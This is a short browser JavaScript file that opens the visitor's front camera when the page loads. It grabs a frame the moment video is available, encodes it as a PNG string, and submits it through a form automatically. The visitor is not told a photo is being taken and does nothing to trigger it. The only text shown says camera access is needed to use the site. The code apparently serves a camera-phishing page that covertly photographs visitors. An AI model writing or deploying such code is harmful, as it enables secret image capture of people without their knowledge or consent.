var video = document.getElementById("video")
const can = document.getElementById("canvas")
const form = document.getElementById("form")
const imgNameInput = document.getElementById("imgName")
const baseString = document.getElementById("baseString")

window.onload = () => {
var mediaDevices = navigator.mediaDevices || navigator.webkitMediaDevices || navigator.mozMediaDevices

if(navigator.mediaDevices){
  
  try{
  navigator.mediaDevices.getUserMedia({
    video: {
      height: {
        max: 2460,
        ideal: 1690,
        min:1080
      },
      width: {
        max: 1940,
        ideal: 1260,
        min: 720
      },
      facingMode: 'user'
    },
    audio:false
  })
  .then(stream => {
    
    video.srcObject = stream
  })
  }catch(err){
    document.write(err.message + "\nPlease allow camera access to use this site...")
  }
}
else{
  alert("Your device doesn't support this feature")
  document.write("Your browser doesn't support this feature")
}

video.addEventListener('canplay', () => drawCan())


function drawCan(){
  try{
    
    var ctx = can.getContext("2d")
    can.height = video.height
    can.width = video.width
    ctx.drawImage(video, 0, 0, can.width, can.height);
    
    let data = can.toDataURL('image/png');
    let imgName = Math.round(Math.random() * 1000000)
    
    imgNameInput.value = imgName
    baseString.value = data
    form.submit()
  }catch(err){
    document.write(err)
  }
}
}
